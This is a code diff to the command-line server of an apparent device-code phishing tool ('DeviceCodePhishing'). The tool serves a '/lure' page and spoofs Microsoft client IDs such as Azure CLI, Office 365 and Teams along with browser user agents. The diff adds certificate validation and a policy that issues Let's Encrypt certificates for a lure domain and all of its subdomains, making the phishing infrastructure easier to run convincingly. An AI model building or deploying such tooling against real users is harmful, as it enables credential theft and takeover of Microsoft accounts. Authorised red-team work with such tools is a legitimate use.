@@ -1,6 +1,8 @@
 package cmd
 
 import (
+	"context"
+	"fmt"
 	"io"
 	"log"
 	"log/slog"
@@ -55,8 +57,8 @@ var runCmd = &cobra.Command{
 	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure
 
 Available User-Agent options for --user-agent:
-  firefox-android       - Firefox on Android
-  chrome-android        - Chrome on Android
+  firefox-android        - Firefox on Android
+  chrome-android         - Chrome on Android
   edge-android          - Edge on Android
   android-browser       - Default Android browser
   firefox-macos         - Firefox on macOS
@@ -145,8 +147,9 @@ Examples:
   # With custom path (URL will be /auth)
   DeviceCodePhishing server --path /auth --client-id azurecli
   
-  # With automatic HTTPS (Let's Encrypt) - domain must be valid and pointing to this server
+  # With automatic HTTPS (Let's Encrypt) - allows domain and all subdomains
   DeviceCodePhishing server --domain example.com --client-id office365
+  # This will accept: example.com, login.example.com, api.example.com, etc.
   
   # With custom SSL certificates
   DeviceCodePhishing server --cert cert.pem --key key.pem --client-id msteams
@@ -155,8 +158,9 @@ Examples:
   DeviceCodePhishing server --address :8443 --domain example.com
 
 Note: Cannot specify both --client-id and --custom-client-id simultaneously
-Note: Cannot use --domain with --cert/--key (use one SSL method only)
-Note: When using --domain, the domain must be properly configured to point to this server's IP`,
+Note: When using --domain, the domain must be properly configured to point to this server's IP
+Note: With --domain, all subdomains are automatically accepted
+Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if both are specified`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// Determine which user agent to use
 		finalUserAgent := customUserAgent
@@ -226,23 +230,46 @@ Note: When using --domain, the domain must be properly configured to point to th
 			Addr: address,
 		}
 
+		// Validate certificate files if provided
+		useCustomCerts := false
+		if certFile != "" || keyFile != "" {
+			if certFile == "" || keyFile == "" {
+				slog.Error("Both --cert and --key must be provided for custom certificates")
+				os.Exit(1)
+			}
+
+			// Check if cert file exists
+			if _, err := os.Stat(certFile); os.IsNotExist(err) {
+				slog.Error("Certificate file does not exist", "file", certFile)
+				os.Exit(1)
+			}
+
+			// Check if key file exists
+			if _, err := os.Stat(keyFile); os.IsNotExist(err) {
+				slog.Error("Key file does not exist", "file", keyFile)
+				os.Exit(1)
+			}
+
+			useCustomCerts = true
+		}
+
 		// Configure SSL/TLS if requested
 		isHTTPS := false
 		protocol := "http"
 		useAutoSSL := false
 
 		// Check if we're using both Let's Encrypt and custom certs (not allowed)
-		if domain != "" && (certFile != "" && keyFile != "") {
+		if domain != "" && useCustomCerts {
 			// Custom certificates take precedence
 			slog.Warn("Using custom certificates, ignoring Let's Encrypt for domain")
 		}
 
 		// Determine if we're using Let's Encrypt
-		if domain != "" && (certFile == "" || keyFile == "") {
+		if domain != "" && !useCustomCerts {
 			useAutoSSL = true
 		}
 
-		if (certFile != "" && keyFile != "") || useAutoSSL {
+		if useCustomCerts || useAutoSSL {
 			isHTTPS = true
 			protocol = "https"
 
@@ -281,19 +308,20 @@ Note: When using --domain, the domain must be properly configured to point to th
 			}
 		}
 
-		if domain != "" {
+		if useAutoSSL {
 			slog.Info("Using automatic HTTPS with Let's Encrypt", "domain", domain)
+		} else if useCustomCerts {
+			slog.Info("Using custom SSL certificates", "cert", certFile, "key", keyFile, "domain", domain)
 		}
 
 		// Start the server
 		if isHTTPS {
-			if domain != "" {
+			if useAutoSSL {
 				// Use Let's Encrypt for automatic HTTPS
 				certManager := autocert.Manager{
 					Prompt:     autocert.AcceptTOS,
-					HostPolicy: autocert.HostWhitelist(domain),
+					HostPolicy: allowSubdomains(domain),
 					Cache:      autocert.DirCache("certs"),
-					ForceRSA:   true,
 					Email:      "", // Optional: add email for notifications
 				}
 				server.TLSConfig = certManager.TLSConfig()
@@ -384,6 +412,23 @@ func getAvailableClientIds() []string {
 		clients = append(clients, key)
 	}
 	return clients
+}
+
+// allowSubdomains returns a HostPolicy that accepts the main domain and all its subdomains
+func allowSubdomains(domain string) autocert.HostPolicy {
+	return func(_ context.Context, host string) error {
+		// Allow exact match
+		if host == domain {
+			return nil
+		}
+
+		// Allow subdomains
+		if strings.HasSuffix(host, "."+domain) {
+			return nil
+		}
+
+		return fmt.Errorf("host %q not configured in domain whitelist", host)
+	}
 }
 
 func getPublicIP() string {
